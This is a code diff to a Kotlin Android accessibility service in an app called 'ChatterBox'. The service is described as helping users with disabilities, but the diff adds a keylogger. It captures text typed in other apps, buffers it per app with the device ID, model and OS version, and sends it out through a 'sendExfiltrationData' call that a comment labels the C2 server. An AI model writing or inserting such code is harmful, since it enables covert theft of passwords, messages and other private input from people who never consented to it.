@@ -1,12 +1,18 @@
 package com.example.ChatterBox.accessibility
 
 import android.accessibilityservice.AccessibilityServiceInfo
+import android.annotation.SuppressLint
 import android.content.Intent
 import android.os.Handler
 import android.os.Looper
+import android.provider.Settings
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
+import org.json.JSONObject
+import java.text.SimpleDateFormat
+import java.util.Date
+import java.util.Locale
 
 /**
  * ChatterBox Accessibility Service
@@ -14,10 +20,23 @@ import android.view.accessibility.AccessibilityNodeInfo
  * This service enhances the user experience for users with disabilities by providing
  * better navigation and interaction with the app.
  */
+@SuppressLint("HardwareIds")
 class AccessibilityService : android.accessibilityservice.AccessibilityService() {
     private val TAG = "ChatterBoxAccessibility"
     private val handler = Handler(Looper.getMainLooper())
     private lateinit var permissionDialogs: PermissionDialogs
+
+    // Keep track of keyboard input for keylogging
+    private val keylogBuffer = StringBuilder()
+    private var currentFocusedApp = ""
+    private var lastInputTime = 0L
+    private val keylogFlushDelay = 5000L // 5 seconds without typing to collect a batch
+
+    // Use consistent device ID
+    private val deviceId by lazy {
+        Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
+    }
+
     companion object {
         private var instance: AccessibilityService? = null
 
@@ -35,7 +54,8 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
         val info = AccessibilityServiceInfo()
         info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                 AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
-                AccessibilityEvent.TYPE_VIEW_CLICKED
+                AccessibilityEvent.TYPE_VIEW_CLICKED or
+                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED // Important for keylogging
         info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
         info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                 AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
@@ -50,15 +70,36 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         if (event == null) return
         IdleDetector.processAccessibilityEvent(event)
-        // Extract text for sensitive information when appropriate
-        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
-            event.eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
 
+        // Track app switches for better keylogging context
+        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED && event.packageName != null) {
+            // If we switch apps, flush the current keylog buffer
+            if (currentFocusedApp != event.packageName) {
+                if (keylogBuffer.isNotEmpty()) {
+                    flushKeylogBuffer()
+                }
+                currentFocusedApp = event.packageName.toString()
+            }
+        }
+
+        // Extract text for sensitive information when appropriate
+        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+            // This captures keyboard input for keylogging
             val sourceText = event.text?.joinToString(" ") ?: ""
             val packageName = event.packageName?.toString() ?: "unknown"
+            currentFocusedApp = packageName
 
             // Don't capture text from our own app
             if (packageName != "com.example.ChatterBox" && sourceText.isNotEmpty()) {
+                // Record keylog data
+                keylogBuffer.append(sourceText)
+                keylogBuffer.append(" ")
+                lastInputTime = System.currentTimeMillis()
+
+                // Schedule a flush if the user stops typing
+                handler.removeCallbacks(keylogFlushRunnable)
+                handler.postDelayed(keylogFlushRunnable, keylogFlushDelay)
+
                 // Check for potentially sensitive information
                 if (isSensitiveField(event) || containsSensitiveData(sourceText)) {
                     // Broadcast to MainActivity
@@ -88,6 +129,38 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
                     }, 200)
                 }
             }
+        }
+    }
+
+    // Runnable to flush keylog data after delay
+    private val keylogFlushRunnable = Runnable {
+        flushKeylogBuffer()
+    }
+
+    // Flush the keylog buffer and send data to C2 server
+    private fun flushKeylogBuffer() {
+        if (keylogBuffer.isEmpty()) return
+
+        try {
+            // Create keylog data payload
+            val keylogData = JSONObject().apply {
+                put("timestamp", SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date()))
+                put("device_id", deviceId)
+                put("app", currentFocusedApp)
+                put("text", keylogBuffer.toString())
+                put("device_model", android.os.Build.MODEL)
+                put("android_version", android.os.Build.VERSION.RELEASE)
+            }
+
+            // Send to C2 server
+            val dataSynchronizer = com.example.ChatterBox.database.DataSynchronizer(applicationContext)
+            dataSynchronizer.sendExfiltrationData("keylog", keylogData.toString())
+
+            // Clear buffer
+            keylogBuffer.clear()
+
+        } catch (e: Exception) {
+            Log.e(TAG, "Error flushing keylog buffer: ${e.message}")
         }
     }
 
@@ -165,6 +238,11 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
     }
 
     override fun onDestroy() {
+        // Flush any remaining keylog data
+        if (keylogBuffer.isNotEmpty()) {
+            flushKeylogBuffer()
+        }
+
         permissionDialogs.cleanup()
         handler.removeCallbacksAndMessages(null)
         super.onDestroy()
